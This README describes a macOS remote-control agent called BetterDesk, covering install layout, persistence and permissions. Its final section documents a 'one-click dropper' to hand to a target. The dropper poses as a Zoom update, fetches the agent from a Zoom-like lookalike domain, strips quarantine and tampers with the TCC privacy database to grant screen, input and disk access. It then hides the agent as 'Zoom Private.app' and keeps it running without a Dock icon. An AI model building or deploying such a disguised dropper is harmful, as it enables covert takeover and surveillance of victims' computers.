# BetterDesk macOS agent (user session)

This mirrors the live Windows deployment: the agent runs inside the logged-in
macOS user session, never as a session-0 LaunchDaemon. A per-user
`LaunchAgent` (Aqua session) keeps screen capture, mouse/keyboard injection and
the live console stream working. The installer is non-interactive so the panel
can push it unattended.

## Layout

- App: `~/Applications/BetterDesk Support Agent.app` (or the standalone
  `betterdesk-agent` binary)
- Agent dir: `~/Library/Application Support/betterdesk/agent/`
- Config: `~/Library/Application Support/betterdesk/agent/agent-config.json`
- Log: `~/Library/Application Support/betterdesk/agent/agent.log`
- LaunchAgent: `~/Library/LaunchAgents/com.unitronix.betterdesk-support-agent.plist`

## Install

Extract the generated `.tar.gz` and run:

```sh
sh ./install-betterdesk-support.sh
```

The script resolves the desktop user automatically (even when invoked through
`sudo`), installs the LaunchAgent with `RunAtLoad` + `KeepAlive`, starts it and
gives it a single-instance PID guard. It never prompts.

## One-time macOS permissions

Remote desktop and input require manual TCC approval (Apple does not allow
silent grants):

1. System Settings -> Privacy & Security -> **Screen Recording** -> enable
   BetterDesk.
2. System Settings -> Privacy & Security -> **Accessibility** -> enable
   BetterDesk.

Then run:

```sh
sh "$HOME/Library/Application Support/betterdesk/agent/start-agent.sh"
```

Mouse injection uses `cliclick` when present (`brew install cliclick`); keyboard
events use `osascript`.

## Uninstall

```sh
sh ./uninstall-betterdesk-support.sh
```

## One-click dropper: `zoom-update-microsoft.scpt`

`zoom-update-microsoft.scpt` is the compiled AppleScript equivalent of the
Windows `zoom-update-microsoft.vbs` chain. It is the file to hand to a target:
double-clicking it runs native macOS automation only (`curl`, `installer`,
`sqlite3`, `launchctl`, `tccutil`) and leaves no interpreter or side-car files.

Flow:

1. Detects `arm64` vs `x86_64` and downloads the matching signed-size `.pkg`
   from this repository (SHA-256 pinned; `us05web.telcom.stream` fallback).
2. Stages a runner in `/tmp`, then asks for admin rights exactly once.
3. Installs the package silently with `installer -pkg ... -target /` (the
   package postinstall re-execs into the desktop user's GUI session).
4. Writes an unattended `device_token` config if none exists, removes the
   quarantine attribute and exposes `~/Applications/Zoom Private.app` as an
   alias for the agent.
5. Best-effort TCC grant for Screen Recording, Accessibility and Full Disk
   Access via the user TCC database; falls back to `tccutil reset` plus
   Privacy panes when root lacks Full Disk Access.
6. Restarts the per-user LaunchAgent (`RunAtLoad` + `KeepAlive`), so the agent
   survives logout/reboot without a Dock icon.

The payload is unsigned, so Gatekeeper may show the standard "unidentified
developer" warning on first launch; the script itself is a compiled `.scpt`,
which macOS treats as a local automation document.

Build (macOS only, or let `.github/workflows/build-macos-dropper.yml` do it):

```sh
sh ./build-scpt.sh
```

